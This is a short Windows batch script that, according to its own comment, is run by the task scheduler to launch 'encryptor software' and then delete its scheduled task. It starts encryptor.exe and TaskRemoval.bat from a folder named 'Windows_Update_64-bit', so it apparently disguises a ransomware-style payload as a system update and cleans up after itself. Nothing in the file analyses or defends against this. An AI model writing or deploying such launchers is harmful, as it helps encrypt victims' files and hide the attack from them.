@echo off

Rem This script is triggered in the task scheduler which runs the encryptor software and then deletes the task from the scheduler.
start C:\Users\%USERNAME%\Documents\Windows_Update_64-bit\encryptor.exe
start C:\Users\%USERNAME%\Documents\Windows_Update_64-bit\TaskRemoval.bat
